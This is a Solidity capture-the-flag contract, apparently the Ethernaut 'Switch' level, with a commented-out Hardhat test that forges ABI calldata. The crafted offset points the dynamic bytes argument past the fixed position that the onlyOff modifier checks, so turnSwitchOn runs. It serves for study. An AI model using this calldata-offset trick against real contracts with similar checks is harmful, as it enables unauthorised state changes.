// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Hardhat test

/*const { ethers } = require("hardhat");
describe("[Attack: ]", () => {
  before(async () => {
    [attacker, User, deployer] = await ethers.getSigners();

    switchContract = await (await ethers.getContractFactory("Switch"))
      .connect(deployer)
      .deploy();
    switchContract.deployed();
  });

  // prettier-ignore
  it("attack", async () => {
    // 0x30c13ade => flipSwitch(bytes)
    // 0x20606e15 => turnSwitchOff()
    // 0x76227e12 => turnSwitchOn()
    data = "0x30c13ade" +
       "0000000000000000000000000000000000000000000000000000000000000060" +
       "0000000000000000000000000000000000000000000000000000000000000000" +
       "20606e1500000000000000000000000000000000000000000000000000000000" +
       "0000000000000000000000000000000000000000000000000000000000000004" +
       "76227e1200000000000000000000000000000000000000000000000000000000";

    await attacker.sendTransaction({
      to: switchContract.address,
      data: data,
    });

    console.log("SwitchOn:", await switchContract.switchOn());
  });
}); */


contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
          // grab function selector from calldata
          calldatacopy(selector, 68, 4) 
        }
        require(
          selector[0] == offSelector,
          "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
      switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
      switchOn = false;
    }
}